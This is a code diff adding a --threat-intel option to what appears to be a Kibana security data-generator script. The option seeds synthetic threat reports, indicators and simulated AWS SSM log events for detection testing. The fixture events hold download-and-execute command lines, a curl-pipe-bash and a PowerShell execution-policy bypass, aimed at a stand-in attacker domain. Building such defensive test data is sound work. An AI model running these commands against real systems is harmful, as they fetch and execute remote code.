@@ -41,12 +41,27 @@ import {
   generateAndIndexAttackDiscoveries,
   type GeneratedAttackDiscoveryGroup,
 } from './lib/attack_discoveries';
+import {
+  THREAT_INTEL_SUBSCRIPTIONS_INDEX,
+  THREAT_REPORTS_DATA_STREAM,
+} from '../../common/threat_intelligence/hub';
 
 const ATTACKS_DIR = scriptsDataDir('episodes', 'attacks');
 const NOISE_DIR = scriptsDataDir('episodes', 'noise');
 const MAPPING_PATH = path.join(ATTACKS_DIR, 'mapping.json');
 const DATA_GENERATOR_CASE_TAG = 'data-generator';
 const TARGET_PREBUILT_RULES_COUNT = 15;
+const THREAT_INTEL_ENVIRONMENT_INDEX = 'logs-aws.local';
+const THREAT_INTEL_REPORT_IDS = [
+  'data-generator-threat-intel-aws-ssm',
+  'data-generator-threat-intel-ransomware-ssm',
+] as const;
+const THREAT_INTEL_EVENT_IDS = [
+  'data-generator-threat-intel-env-aws-ssm-1',
+  'data-generator-threat-intel-env-aws-ssm-2',
+  'data-generator-threat-intel-env-aws-ssm-3',
+] as const;
+const THREAT_INTEL_SUBSCRIPTION_ID = 'data-generator-threat-intel-digest';
 
 const normalizeApiKey = (input: string): string => input.trim().replace(/^ApiKey\s+/i, '');
 
@@ -639,6 +654,444 @@ const cleanGeneratedData = async ({
   // to "no preview alerts were written" on subsequent runs.
 };
 
+const timestampAt = (startMs: number, endMs: number, ratio: number): string =>
+  new Date(Math.round(startMs + (endMs - startMs) * ratio)).toISOString();
+
+const sha256 = (input: string): string => crypto.createHash('sha256').update(input).digest('hex');
+
+const defang = (value: string): string =>
+  value.replace(/\./g, '[.]').replace(/^https?:/, 'https[:]');
+
+const buildThreatIntelReport = ({
+  id,
+  timestamp,
+  title,
+  body,
+  severity,
+  severityScore,
+  actor,
+  relatedReportIds,
+  environmentHits,
+}: {
+  id: string;
+  timestamp: string;
+  title: string;
+  body: string;
+  severity: 'medium' | 'high' | 'critical';
+  severityScore: number;
+  actor?: string;
+  relatedReportIds: string[];
+  environmentHits: number;
+}) => {
+  const iocs = [
+    { type: 'ip', value: '45.83.64.10', defanged: defang('45.83.64.10'), severity: 'high' },
+    {
+      type: 'domain',
+      value: 'evil-ssm-control.net',
+      defanged: defang('evil-ssm-control.net'),
+      severity: 'high',
+    },
+    {
+      type: 'url',
+      value: 'https://evil-ssm-control.net/update.ps1',
+      defanged: defang('https://evil-ssm-control.net/update.ps1'),
+      severity: 'high',
+    },
+  ];
+
+  return {
+    '@timestamp': timestamp,
+    content_fingerprint: sha256(body),
+    space_id: 'default',
+    source: {
+      type: 'manual',
+      name: 'Security data generator',
+      url: `data-generator://threat-intel/${id}`,
+      adapter_id: 'data-generator',
+    },
+    content: {
+      title,
+      title_bm25: title,
+      body_text: body,
+      body_text_bm25: body,
+      language: 'en',
+    },
+    severity: { level: severity, score: severityScore },
+    rank_score: severityScore * 0.92,
+    corroborated_rank_score: severityScore * 1.18,
+    extracted: {
+      iocs,
+      ioc_set_hash: sha256(iocs.map((ioc) => `${ioc.type}:${ioc.value}`).join('|')),
+      relevance: 0.92,
+      detection_actionability: 'rule_candidate',
+      ttps: {
+        tactics: ['TA0002', 'TA0011'],
+        techniques: ['T1059.001', 'T1105', 'T1219'],
+      },
+      behaviors: [
+        {
+          id: `${id}:T1059.001`,
+          technique_id: 'T1059.001',
+          description:
+            'PowerShell launched from a remote management agent to execute follow-on tooling.',
+          telemetry_targets: ['process.command_line', 'process.parent.name', 'host.name'],
+          llm_confidence: 0.97,
+          confidence: 0.97,
+        },
+        {
+          id: `${id}:T1105`,
+          technique_id: 'T1105',
+          description:
+            'Tooling downloaded from attacker-controlled infrastructure after remote access.',
+          telemetry_targets: ['url.full', 'destination.domain', 'process.command_line'],
+          llm_confidence: 0.94,
+          confidence: 0.94,
+        },
+        {
+          id: `${id}:T1219`,
+          technique_id: 'T1219',
+          description: 'Remote management tooling used as the initial operator control channel.',
+          telemetry_targets: ['process.name', 'event.dataset', 'cloud.provider'],
+          llm_confidence: 0.88,
+          confidence: 0.88,
+        },
+      ],
+      threat_actors: actor ? [actor] : [],
+      target_sectors: ['technology', 'cloud-hosted-services'],
+      categories: ['cloud-security', 'ransomware', 'malware'],
+    },
+    geography: { regions: ['north-america', 'global'] },
+    provenance: {
+      ingested_at: timestamp,
+      extracted_at: timestamp,
+      extraction_method: 'data_generator',
+      related_reports: relatedReportIds,
+      related_reports_count: relatedReportIds.length,
+      environment_hits: {
+        window: 'last_7d',
+        computed_at: timestamp,
+        layer_1_ioc_match: environmentHits,
+        layer_2_behavioral: 2,
+      },
+      environment_hits_total: environmentHits + 2,
+    },
+    feedback: {
+      ioc_hit_count: environmentHits,
+      ttp_hit_count: 2,
+      affected_host_count: 2,
+      affected_user_count: 2,
+      last_hunted_at: timestamp,
+      last_hunt_status: 'environment_hits_found',
+      last_hunt_window: {
+        from: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString(),
+        to: timestamp,
+      },
+    },
+  };
+};
+
+const buildThreatIntelEnvironmentDocs = (timestamps: string[]) => [
+  {
+    '@timestamp': timestamps[0],
+    event: { dataset: 'aws.cloudtrail', module: 'aws', action: 'SendCommand' },
+    data_stream: { dataset: 'aws.cloudtrail', type: 'logs', namespace: 'local' },
+    cloud: { provider: 'aws', service: { name: 'ssm' }, region: 'us-east-1' },
+    host: { name: 'data-generator-ssm-host-1', os: { family: 'windows' } },
+    user: { name: 'data-generator-aws-admin' },
+    source: { ip: '45.83.64.10' },
+    destination: { ip: '10.42.7.15', domain: 'evil-ssm-control.net' },
+    url: { full: 'https://evil-ssm-control.net/update.ps1', domain: 'evil-ssm-control.net' },
+    process: {
+      name: 'powershell.exe',
+      command_line:
+        'powershell.exe -ExecutionPolicy Bypass -File https://evil-ssm-control.net/update.ps1',
+      parent: { name: 'amazon-ssm-agent.exe' },
+    },
+    tags: ['data-generator', 'threat-intel', 'cloud-security'],
+  },
+  {
+    '@timestamp': timestamps[1],
+    event: { dataset: 'aws.cloudtrail', module: 'aws', action: 'RunShellScript' },
+    data_stream: { dataset: 'aws.cloudtrail', type: 'logs', namespace: 'local' },
+    cloud: { provider: 'aws', service: { name: 'ssm' }, region: 'us-east-1' },
+    host: { name: 'data-generator-ssm-host-2', os: { family: 'linux' } },
+    user: { name: 'data-generator-aws-ops' },
+    source: { ip: '45.83.64.10' },
+    destination: { ip: '10.42.8.20', domain: 'evil-ssm-control.net' },
+    url: { full: 'https://evil-ssm-control.net/update.ps1', domain: 'evil-ssm-control.net' },
+    process: {
+      name: 'sh',
+      command_line: 'sh -c curl https://evil-ssm-control.net/update.ps1 | bash',
+      parent: { name: 'amazon-ssm-agent' },
+    },
+    tags: ['data-generator', 'threat-intel', 'cloud-security'],
+  },
+  {
+    '@timestamp': timestamps[2],
+    event: { dataset: 'aws.vpcflow', module: 'aws', action: 'connection_attempt' },
+    data_stream: { dataset: 'aws.vpcflow', type: 'logs', namespace: 'local' },
+    cloud: { provider: 'aws', region: 'us-east-1' },
+    host: { name: 'data-generator-ssm-host-1', os: { family: 'windows' } },
+    user: { name: 'data-generator-aws-admin' },
+    source: { ip: '10.42.7.15' },
+    destination: { ip: '45.83.64.10', domain: 'evil-ssm-control.net' },
+    url: { full: 'https://evil-ssm-control.net/update.ps1', domain: 'evil-ssm-control.net' },
+    tags: ['data-generator', 'threat-intel', 'cloud-security'],
+  },
+];
+
+const ensureThreatIntelEnvironmentIndex = async ({
+  esClient,
+  log,
+}: {
+  esClient: Client;
+  log: ToolingLog;
+}) => {
+  const exists = await esClient.indices.exists({ index: THREAT_INTEL_ENVIRONMENT_INDEX });
+  if (exists) return;
+
+  log.info(`Creating ${THREAT_INTEL_ENVIRONMENT_INDEX} for threat-intel source events.`);
+  await esClient.indices.create({
+    index: THREAT_INTEL_ENVIRONMENT_INDEX,
+    mappings: {
+      dynamic: true,
+      properties: {
+        '@timestamp': { type: 'date' },
+        event: {
+          properties: {
+            dataset: { type: 'keyword' },
+            module: { type: 'keyword' },
+            action: { type: 'keyword' },
+          },
+        },
+        data_stream: {
+          properties: {
+            dataset: { type: 'keyword' },
+            type: { type: 'keyword' },
+            namespace: { type: 'keyword' },
+          },
+        },
+        cloud: {
+          properties: {
+            provider: { type: 'keyword' },
+            region: { type: 'keyword' },
+          },
+        },
+        host: {
+          properties: {
+            name: { type: 'keyword' },
+            os: {
+              properties: {
+                family: { type: 'keyword' },
+              },
+            },
+          },
+        },
+        user: {
+          properties: {
+            name: { type: 'keyword' },
+          },
+        },
+        source: {
+          properties: {
+            ip: { type: 'ip' },
+          },
+        },
+        destination: {
+          properties: {
+            ip: { type: 'ip' },
+            domain: { type: 'keyword' },
+          },
+        },
+        url: {
+          properties: {
+            full: { type: 'keyword' },
+            domain: { type: 'keyword' },
+          },
+        },
+        process: {
+          properties: {
+            name: { type: 'keyword' },
+            command_line: { type: 'wildcard' },
+            parent: {
+              properties: {
+                name: { type: 'keyword' },
+              },
+            },
+          },
+        },
+        tags: { type: 'keyword' },
+      },
+    },
+  });
+};
+
+const deleteGeneratedThreatIntelData = async ({
+  esClient,
+  log,
+}: {
+  esClient: Client;
+  log: ToolingLog;
+}) => {
+  const deleteByIds = async (index: string, ids: readonly string[]) => {
+    try {
+      await esClient.deleteByQuery({
+        index,
+        conflicts: 'proceed',
+        refresh: true,
+        query: { ids: { values: [...ids] } },
+      });
+    } catch (e) {
+      const status = getStatusCode(e);
+      if (status !== 404) {
+        throw e;
+      }
+    }
+  };
+
+  await deleteByIds(THREAT_REPORTS_DATA_STREAM, THREAT_INTEL_REPORT_IDS);
+  await deleteByIds(THREAT_INTEL_SUBSCRIPTIONS_INDEX, [THREAT_INTEL_SUBSCRIPTION_ID]);
+  await deleteByIds(THREAT_INTEL_ENVIRONMENT_INDEX, THREAT_INTEL_EVENT_IDS);
+  log.info(`Deleted prior threat-intel generator fixtures, if present.`);
+};
+
+const ensureThreatIntelDataStream = async ({
+  esClient,
+  log,
+}: {
+  esClient: Client;
+  log: ToolingLog;
+}) => {
+  try {
+    await esClient.indices.getDataStream({ name: THREAT_REPORTS_DATA_STREAM });
+  } catch (e) {
+    const status = getStatusCode(e);
+    if (status !== 404) {
+      throw e;
+    }
+    try {
+      await esClient.indices.createDataStream({ name: THREAT_REPORTS_DATA_STREAM });
+      log.info(`Created ${THREAT_REPORTS_DATA_STREAM} data stream.`);
+    } catch (createError) {
+      throw new Error(
+        `Threat intelligence data stream ${THREAT_REPORTS_DATA_STREAM} is not available. ` +
+          `Start Kibana with the threat-intelligence skill enabled so the plugin can install its templates. ` +
+          `Original error: ${formatError(createError)}`
+      );
+    }
+  }
+};
+
+const generateThreatIntelData = async ({
+  esClient,
+  log,
+  startMs,
+  endMs,
+  spaceId,
+}: {
+  esClient: Client;
+  log: ToolingLog;
+  startMs: number;
+  endMs: number;
+  spaceId: string;
+}) => {
+  log.info(`--threat-intel enabled: seeding threat reports, subscriptions, and source events.`);
+
+  await ensureThreatIntelDataStream({ esClient, log });
+  await ensureThreatIntelEnvironmentIndex({ esClient, log });
+  await deleteGeneratedThreatIntelData({ esClient, log });
+
+  const reportTimestamp = timestampAt(startMs, endMs, 0.7);
+  const relatedReportTimestamp = timestampAt(startMs, endMs, 0.75);
+  const eventTimestamps = [
+    timestampAt(startMs, endMs, 0.82),
+    timestampAt(startMs, endMs, 0.84),
+    timestampAt(startMs, endMs, 0.86),
+  ];
+  const primaryBody =
+    'Ransomware operators are abusing AWS Systems Manager for remote management access. ' +
+    'The actor uses amazon-ssm-agent to launch PowerShell and download tooling from ' +
+    'https://evil-ssm-control.net/update.ps1. Observed infrastructure includes 45.83.64.10 ' +
+    'and evil-ssm-control.net. Detection teams should hunt for PowerShell or shell execution ' +
+    'from SSM agents, followed by ingress tool transfer from attacker infrastructure.';
+  const relatedBody =
+    'A related cloud-security advisory describes remote management abuse through AWS SSM ' +
+    'RunShellScript commands. The same control infrastructure, 45.83.64.10 and ' +
+    'evil-ssm-control.net, was used to stage scripts and transfer tooling. Durable coverage ' +
+    'should focus on T1059.001, T1105, and T1219 rather than only blocking the current IOCs.';
+
+  const reports = [
+    buildThreatIntelReport({
+      id: THREAT_INTEL_REPORT_IDS[0],
+      timestamp: reportTimestamp,
+      title: 'Ransomware operators abusing AWS SSM and PowerShell',
+      body: primaryBody,
+      severity: 'critical',
+      severityScore: 90,
+      actor: 'sailor-81',
+      relatedReportIds: [THREAT_INTEL_REPORT_IDS[1]],
+      environmentHits: 3,
+    }),
+    buildThreatIntelReport({
+      id: THREAT_INTEL_REPORT_IDS[1],
+      timestamp: relatedReportTimestamp,
+      title: 'Synthetic advisory: AWS SSM agent abuse for remote access',
+      body: relatedBody,
+      severity: 'high',
+      severityScore: 80,
+      actor: 'sailor-81',
+      relatedReportIds: [THREAT_INTEL_REPORT_IDS[0]],
+      environmentHits: 2,
+    }),
+  ].map((report) => ({
+    ...report,
+    space_id: spaceId,
+  }));
+
+  const reportBulk = reports.flatMap((document, index) => [
+    {
+      create: {
+        _index: THREAT_REPORTS_DATA_STREAM,
+        _id: THREAT_INTEL_REPORT_IDS[index],
+      },
+    },
+    document,
+  ]);
+  const reportResponse = await esClient.bulk({ refresh: true, body: reportBulk });
+  assertNoBulkErrors(THREAT_REPORTS_DATA_STREAM, reportResponse, log);
+
+  const envDocs = buildThreatIntelEnvironmentDocs(eventTimestamps);
+  const envBulk = envDocs.flatMap((document, index) => [
+    { index: { _index: THREAT_INTEL_ENVIRONMENT_INDEX, _id: THREAT_INTEL_EVENT_IDS[index] } },
+    document,
+  ]);
+  const envResponse = await esClient.bulk({ refresh: true, body: envBulk });
+  assertNoBulkErrors(THREAT_INTEL_ENVIRONMENT_INDEX, envResponse, log);
+
+  await esClient.index({
+    index: THREAT_INTEL_SUBSCRIPTIONS_INDEX,
+    id: THREAT_INTEL_SUBSCRIPTION_ID,
+    refresh: true,
+    document: {
+      owner: 'data-generator',
+      tags: ['data-generator', 'cloud-security', 'ransomware'],
+      severity_threshold: 'medium',
+      schedule_rrule: 'FREQ=DAILY;BYHOUR=9;BYMINUTE=0',
+      delivery: { type: 'email', target: 'security-ops@example.com' },
+      human_summary:
+        'Daily digest of medium+ severity reports tagged `data-generator`, `cloud-security`, `ransomware` delivered to `security-ops@example.com`.',
+      template_id: 'data-generator-threat-intel',
+      space_id: spaceId,
+      created_at: reportTimestamp,
+      updated_at: reportTimestamp,
+    },
+  });
+
+  log.info(
+    `Seeded ${reports.length} threat report(s), ${envDocs.length} environment event(s), and 1 digest subscription.`
+  );
+};
+
 const ensurePreviewAlertsIndex = async ({
   esClient,
   log,
@@ -811,6 +1264,7 @@ export const cli = () => {
       const skipAlerts = Boolean(cliContext.flags['skip-alerts']);
       const skipRulesetPreview = Boolean(cliContext.flags['skip-ruleset-preview']);
       const validateFixtures = Boolean(cliContext.flags['validate-fixtures']);
+      const threatIntel = Boolean(cliContext.flags['threat-intel']);
       const attacks = Boolean(cliContext.flags.attacks);
       const createCases = Boolean(cliContext.flags.cases);
       const shouldGenerateAttackDiscoveries = attacks || createCases;
@@ -982,6 +1436,9 @@ export const cli = () => {
             ruleIds: ruleIdsForClean,
             indexPrefix,
           });
+          if (threatIntel) {
+            await deleteGeneratedThreatIntelData({ esClient, log });
+          }
         }
 
         const fileSets = listEpisodeFileSets(episodes);
@@ -1017,6 +1474,16 @@ export const cli = () => {
         });
 
         log.info(`Done indexing episode events/endpoint alerts (and insights-alerts copies).`);
+
+        if (threatIntel) {
+          await generateThreatIntelData({
+            esClient,
+            log,
+            startMs,
+            endMs,
+            spaceId: effectiveSpaceId,
+          });
+        }
 
         // In serverless, the Security alerts destination is typically a data stream and may not exist
         // until detections are initialized. Best-effort initialize here, then verify before preview/copy.
@@ -1182,6 +1649,7 @@ export const cli = () => {
           'skip-ruleset-preview',
           'attacks',
           'cases',
+          'threat-intel',
           'validate-fixtures',
         ],
         alias: {
@@ -1207,6 +1675,7 @@ export const cli = () => {
           'skip-ruleset-preview': false,
           attacks: false,
           cases: false,
+          'threat-intel': false,
           'validate-fixtures': true,
         },
         allowUnexpected: false,
@@ -1223,6 +1692,7 @@ export const cli = () => {
         --max-preview-invocations         Max rule preview invocations per rule (Default: 12). Lower = faster for large time ranges.
         --skip-alerts                     Skip rule preview + copying alerts entirely (raw event/endpoint alert indexing only)
         --skip-ruleset-preview            Skip previews of the selected prebuilt rules (baseline attribution only; faster)
+        --threat-intel                    Seed threat-intel reports, matching source events, and a digest subscription for Agent Builder workflow testing
         --attacks                         Generate synthetic Attack Discoveries (opt-in)
         --cases                          Create cases from ~50% of generated Attack Discoveries (implies --attacks)
         --no-validate-fixtures            Disable fixture validation (default: validation enabled)
